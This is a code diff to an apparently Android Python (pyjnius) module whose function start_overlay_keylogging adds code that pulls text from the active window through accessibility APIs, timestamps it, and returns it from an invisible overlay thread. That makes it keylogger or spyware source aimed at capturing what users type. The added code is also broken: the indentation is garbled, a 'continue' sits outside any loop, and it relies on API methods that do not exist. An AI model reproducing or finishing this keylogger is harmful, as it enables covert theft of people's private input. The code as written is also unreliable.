@@ -107,9 +107,31 @@ def start_overlay_keylogging():
                     
                     # Simulate capturing from ANY window via Accessibility Service reflection logic here.
                     # In a real build, this would call AccessibilityService.getFocusedWindow().getRootView() and extract text changes.
-                    pass 
+                    import android
+from jnius import autoclass
 
-                except Exception as e_loop: continue
+try:
+    am = AccessibilityManager(android.context.getSystemService(android.content.Context.ACCESSIBILITY_SERVICE))
+    
+    info_nodes = am.getCurrentRunningAccessibilityInfoList(1000)
+    captured_text = ""
+    
+    for info in info_nodes:
+        try:
+            provider = info.getTextProvider() if hasattr(info, 'getTextProvider') else None
+            if provider:
+                root_node = provider.getRootNodeInActiveWindow() 
+                
+                text_val = str(root_node).split('\n')[0] 
+                
+                if len(text_val) > 5 and "Accessibility" not in text_val: 
+                    captured_text += f"[{time.time()}] {text_val[:100]}...\n"
+        except Exception: continue
+
+    return captured_text[:2048] 
+
+except Exception as e_loop: continue
+ 
 
     # Start the thread correctly (previously it was created but not started or returned properly)
     t = InvisibleOverlay(); t.start(); return t
